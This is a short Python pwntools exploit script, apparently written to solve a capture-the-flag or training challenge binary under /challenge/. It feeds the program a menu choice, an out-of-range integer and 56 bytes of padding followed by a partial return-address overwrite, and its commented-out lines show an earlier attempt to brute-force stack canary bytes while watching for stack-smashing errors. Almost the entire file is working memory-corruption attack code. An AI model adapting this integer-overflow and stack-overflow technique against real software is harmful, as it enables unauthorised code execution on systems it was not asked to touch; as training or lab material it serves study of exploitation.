from pwn import *

context.arch = 'amd64'
context.encoding ='latin'
context.log_level = 'INFO'
warnings.simplefilter('ignore')

# (131)\x83 (58)\x3a (172)\xac (203)\xcb (160)\xa0 () ()

with process([f"/challenge/{os.getenv('HOSTNAME')}"], close_fds=False) as p:
    # info(p.readrepeat(1))
    p.send(b'2'+ b'\n' + b'2147483648' + b'\n'+ b'a'*56 + b'\xcd\x17\x40')
    info(p.readrepeat(1))
    # 49eca85b9aa5e800
            


       
        # print(hex(i))
        # payload = b'a'*(88)+b'\0'
        # payload = payload + p8(0xa1) + p8(0xbe) + p8(0xb2) + p8(0x4a) + p8(0xae) + p8(0xb5) + p8(0x7f) + b'b'*8 + b'\x77' + p8(0x09+(16*i))
        # p.readrepeat(1)
        # p.sendline(b'1000')
        # p.readrepeat(1)
        # p.send(payload)
        # p.readuntil(b'Goodbye!')
        # info(p.readrepeat(1))
        # if b"*** stack" in s: 
        #     print("smashing")
        # else: 
        #     break
        # 61 a1 be b2 4a ae b5 7f



